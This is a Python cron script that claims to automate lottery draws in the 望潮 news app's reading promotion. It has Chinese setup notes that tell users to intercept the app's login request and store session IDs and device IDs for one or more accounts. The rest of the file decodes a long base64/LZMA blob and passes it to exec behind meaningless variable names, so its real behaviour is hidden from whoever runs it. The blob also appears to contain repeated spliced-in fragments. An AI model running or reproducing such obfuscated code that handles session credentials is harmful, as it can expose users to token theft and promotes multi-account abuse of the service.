'''
cron: 30 11 * * *
new Env('望潮阅读抽奖');
群组：https://t.me/yangmaoxz
频道地址：https://t.me/ymxzpd

使用方法：
1.打开app，点击阅读有礼
2.抓包https://xmt.taizhou.com.cn/prod-api/user-read/app/login接口的id,sessionId,deviceId参数
3.配置文件添加
单账户：export wcread="[ {'name': 'xxx','aid': 'id', 'sid': 'sessionId', 'deviceId':'deviceId'}]"
多账户：export wcread="[
{'name': 'xxx','aid': 'xxxx', 'sid': 'xxxx', 'deviceId':'xxxx'},
{'name': 'xxx','aid': 'xxxx', 'sid': 'xxxx', 'deviceId':'xxxx'}
]"
参数说明：
bz:备注名随意填写
aid:2步骤中的id参数
sid:2步骤中的sessionId参数
deviceId:2步骤中的deviceId参数
'''
import lzma,base64
zHpsKLviEVbCTQ8419uEC2UaRX7itXEQBGMDPvrmRgnZLcNqaf=base64.b64decode
zHpsKLviEVbCTQ8419uEC2UaRX7itXEQBGMDPvrmRgnZLcNqaB=lzma.decompress
exec(zHpsKLviEVbCTQ8419uEC2UaRX7itXEQBGMDPvrmRgnZLcNqaB(zHpsKLviEVbCTQ8419uEC2UaRX7itXEQBGMDPvrmRgnZLcNqaf('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')))

